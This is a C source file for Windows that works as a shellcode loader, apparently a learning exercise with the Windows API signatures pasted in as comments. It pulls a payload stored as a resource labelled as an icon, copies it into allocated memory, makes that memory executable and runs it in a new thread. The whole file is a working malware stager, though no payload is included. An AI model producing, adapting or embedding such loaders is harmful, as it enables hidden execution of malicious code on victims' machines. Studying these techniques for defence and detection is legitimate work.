#include <windows.h>
#include <stdio.h>
#include <string.h>

#define SC_ICON 1010

int main(void)
{
    //find shellcode
    HRSRC shellcode= FindResourceW(NULL, MAKEINTRESOURCEW(SC_ICON), RT_RCDATA);
    // [in, optional] HMODULE hModule,
    // [in]           LPCSTR  lpName,
    // [in]           LPCSTR  lpType

    // load shellcode payload
    HGLOBAL shellcode_handel = LoadResource(NULL,shellcode);
    // [in, optional] HMODULE hModule,
    // [in]           HRSRC   hResInfo
    
    //get pointer to shellcode resource
    LPVOID shellcode_payload=LockResource(shellcode_handel);
    //[in] HGLOBAL hResData

    //length of shellcode
    DWORD shellcode_length=SizeofResource(NULL, shellcode);
//   [in, optional] HMODULE hModule,
//   [in]           HRSRC   hResInfo



    // allocate virtual memory 
    LPVOID memory_address = VirtualAlloc(NULL, shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);   //LPVOID is long pointer to void
    //[in, optional] LPVOID lpAddress,
    //[in]           SIZE_T dwSize,
    //[in]           DWORD  flAllocationType,
    //[in]           DWORD  flProtect


    //load shellcode into memoy
    RtlMoveMemory(memory_address,shellcode_payload,shellcode_length);
    //_Out_       VOID UNALIGNED *Destination,
    //_In_  const VOID UNALIGNED *Source,
    //_In_        SIZE_T         Length


    //make shellcode executable
    DWORD old_protection=0;
    BOOL returned_vp= VirtualProtect(memory_address,shellcode_length,PAGE_EXECUTE_READWRITE, &old_protection);
    //[in]  LPVOID lpAddress,
    //[in]  SIZE_T dwSize,
    //[in]  DWORD  flNewProtect,
    //[out] PDWORD lpflOldProtect

    if(returned_vp != 0)
    {
        //make a thread
        HANDLE thread_handel = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) memory_address, NULL , 0, NULL);
        //[in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
        //[in]            SIZE_T                  dwStackSize,
        //[in]            LPTHREAD_START_ROUTINE  lpStartAddress,
        //[in, optional]  __drv_aliasesMem LPVOID lpParameter,
        //[in]            DWORD                   dwCreationFlags,
        //[out, optional] LPDWORD                 lpThreadId


        //wait for thread to complete
        WaitForSingleObject(thread_handel,INFINITE);
        //[in] HANDLE hHandle,
        //[in] DWORD  dwMilliseconds
    
    } 

return(0);
}
